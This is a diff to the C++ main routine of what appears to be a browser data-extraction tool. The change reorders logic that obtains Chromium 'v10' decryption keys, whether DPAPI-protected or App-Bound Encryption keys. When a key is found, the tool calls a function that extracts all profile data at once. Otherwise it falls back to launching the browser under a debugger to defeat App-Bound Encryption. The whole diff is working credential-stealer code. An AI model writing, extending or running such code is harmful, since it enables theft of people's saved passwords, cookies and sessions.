@@ -125,6 +125,29 @@ int main() {
             continue;
         }
 
+        std::cout << "Processing " << config.name << "..." << std::endl;
+
+        std::vector<uint8_t> v10_key;
+        bool is_dpapi = false;
+        bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);
+
+        bool should_debug = config.has_abe;
+
+        if (has_key) {
+            if (is_dpapi && !config.has_abe) {
+                std::cout << "Found DPAPI key for " << config.name << ", extracting immediately..." << std::endl;
+                extract_all_profiles_data({}, config, user_data_dir);
+                should_debug = false;
+            } else if (!is_dpapi && !config.has_abe) {
+                std::cout << "Found ABE key for " << config.name << ", extracting immediately..." << std::endl;
+                extract_all_profiles_data(v10_key, config, user_data_dir);
+                should_debug = false;
+            }
+        }
+
+        if (!should_debug && !config.has_abe) continue;
+
+        // Debugger-based extraction requires the executable
         std::wstring exe_path = L"";
         for (const auto& path : config.exe_paths) {
             if (fs::exists(path)) {
@@ -162,31 +185,9 @@ int main() {
         }
 
         if (exe_path.empty()) {
-            std::cout << "Executable not found for " << config.name << ", skipping..." << std::endl;
+            std::cout << "Executable not found for " << config.name << ", skipping debugger method..." << std::endl;
             continue;
         }
-
-        std::cout << "Processing " << config.name << "..." << std::endl;
-
-        std::vector<uint8_t> v10_key;
-        bool is_dpapi = false;
-        bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);
-
-        bool should_debug = config.has_abe;
-
-        if (has_key) {
-            if (is_dpapi && !config.has_abe) {
-                std::cout << "Found DPAPI key for " << config.name << ", extracting immediately..." << std::endl;
-                extract_all_profiles_data({}, config, user_data_dir);
-                should_debug = false;
-            } else if (!is_dpapi && !config.has_abe) {
-                std::cout << "Found ABE key for " << config.name << ", extracting immediately..." << std::endl;
-                extract_all_profiles_data(v10_key, config, user_data_dir);
-                should_debug = false;
-            }
-        }
-
-        if (!should_debug && !config.has_abe) continue;
 
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi = { 0 };
